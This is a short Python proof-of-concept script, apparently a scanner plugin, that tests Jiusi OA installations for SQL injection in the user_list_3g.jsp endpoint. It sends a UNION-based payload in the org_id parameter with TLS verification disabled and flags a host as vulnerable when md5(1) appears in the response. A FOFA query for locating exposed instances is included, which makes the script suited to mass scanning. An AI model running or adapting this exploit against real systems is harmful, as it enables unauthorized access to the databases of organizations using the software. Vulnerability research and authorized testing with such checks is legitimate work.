#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/mcEnN5OeKXUFPVZlIQeP_g',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '九思OA软件user_list_3g.jsp存在SQL注入',

      'level'     :   'high',

      'FOFA'      :   'app="九思软件-OA"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/4/8',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/jsoa/wap2/personalMessage/user_list_3g.jsp?userIds=1&userNames=1&content=1&org_id=1%20union/**/select/**/1,md5(1)%20%23'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'c4ca4238a0b923820dcc509a6f75849b',res.text,re.S):
      ret['huixian'] = '存在1的md5加密结果：c4ca4238a0b923820dcc509a6f75849b'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret